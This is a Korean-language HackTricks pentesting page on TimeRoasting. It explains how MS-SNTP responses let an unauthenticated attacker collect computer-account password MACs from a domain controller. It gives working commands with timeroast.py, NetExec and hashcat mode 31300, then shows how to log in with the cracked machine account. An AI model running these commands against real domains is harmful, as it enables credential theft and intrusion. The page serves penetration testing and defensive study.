# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting은 legacy MS-SNTP authentication extension을 악용합니다. MS-SNTP에서 client는 모든 computer account RID를 포함하는 68바이트 request를 전송할 수 있으며, domain controller는 해당 computer account의 NTLM hash (MD4)를 key로 사용해 response에 대한 MAC을 계산한 후 이를 반환합니다.<sup>[[1]](#references)</sup> 공격자는 인증 없이 이러한 MS-SNTP MAC을 수집하고 이를 offline에서 crack (Hashcat mode 31300)하여 computer account password를 복구할 수 있습니다.<sup>[[2]](#references)</sup>

자세한 내용은 공식 MS-SNTP spec의 section 3.1.5.1 "Authentication Request Behavior" 및 4 "Protocol Examples"를 참조하세요.<sup>[[1]](#references)</sup>
![TimeRoasting: 자세한 내용은 공식 MS-SNTP spec의 section 3.1.5.1 "Authentication Request Behavior" 및 4 "Protocol Examples"를 참조하세요](../../images/Pasted%20image%2020250709114508.png)
ExtendedAuthenticatorSupported ADM element가 false인 경우, client는 68바이트 request를 전송하고 authenticator의 Key Identifier subfield에서 가장 낮은 유효 31비트에 RID를 포함합니다.<sup>[[1]](#references)</sup>

> ExtendedAuthenticatorSupported ADM element가 false인 경우, client는 Client NTP Request message를 MUST construct합니다. Client NTP Request message의 길이는 68바이트입니다. client는 section 2.2.1에 설명된 대로 Client NTP Request message의 Authenticator field를 설정하며, RID value의 가장 낮은 유효 31비트를 authenticator의 Key Identifier subfield에서 가장 낮은 유효 31비트에 기록한 다음, Key Selector value를 Key Identifier subfield의 가장 높은 유효 비트에 기록합니다.<sup>[[1]](#references)</sup>

section 4 (Protocol Examples)에서:

> request를 수신한 후, server는 수신한 message size가 68바이트인지 확인합니다. 수신한 message size가 68바이트라고 가정하면, server는 수신한 message에서 RID를 추출합니다. server는 이를 사용하여 [MS-NRPC] section 3.5.4.8.2에 명시된 NetrLogonComputeServerDigest method를 호출해 crypto-checksum을 계산하고, section 3.2.5에 명시된 대로 수신한 message의 Key Identifier subfield에서 가장 높은 유효 비트를 기준으로 crypto-checksum을 선택합니다. 그런 다음 server는 Key Identifier field를 0으로 설정하고 Crypto-Checksum field를 계산된 crypto-checksum으로 설정하여 client에 response를 전송합니다.<sup>[[1]](#references)</sup>

crypto-checksum은 MD5 기반이며 (3.2.5.1.1 참조) offline에서 crack할 수 있으므로 roasting attack이 가능합니다.<sup>[[1]](#references)</sup>

## Attack 방법

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort가 작성한 Timeroasting scripts<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## 실전 공격(인증 없이) with NetExec + Hashcat

- NetExec can enumerate and collect MS-SNTP MACs for computer RIDs 인증 없이 and print $sntp-ms$ hashes ready for cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Hashcat mode 31300 (MS-SNTP MAC)으로 오프라인 Crack:<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- 복구된 평문은 컴퓨터 계정 비밀번호에 해당합니다. NTLM이 비활성화된 경우 Kerberos(-k)를 사용하여 머신 계정으로 직접 시도하세요:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
운영 팁
- Kerberos 사용 전에 정확한 time sync를 확인하세요: `sudo ntpdate <dc_fqdn>`
- 필요한 경우 AD realm용 krb5.conf를 생성하세요: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- 인증된 foothold를 확보한 후 LDAP/BloodHound를 통해 RID를 principal에 매핑하세요.

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – 공식 문서](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
